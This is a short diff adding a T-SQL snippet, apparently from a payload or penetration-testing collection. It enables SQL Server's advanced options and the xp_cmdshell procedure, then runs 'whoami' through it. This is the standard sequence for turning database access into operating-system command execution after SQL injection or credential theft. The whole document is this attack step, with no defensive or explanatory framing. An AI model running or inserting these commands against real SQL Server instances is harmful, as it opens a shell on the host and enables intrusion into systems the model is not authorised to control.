@@ -1,0 +1,6 @@
+EXEC sp_configure 'show advanced option'
+EXEC sp_configure 'show advanced option', '1'; 
+RECONFIGURE WITH OVERRIDE;   
+EXEC sp_configure 'xp_cmdshell', 1;  
+RECONFIGURE;
+xp_cmdshell 'whoami'
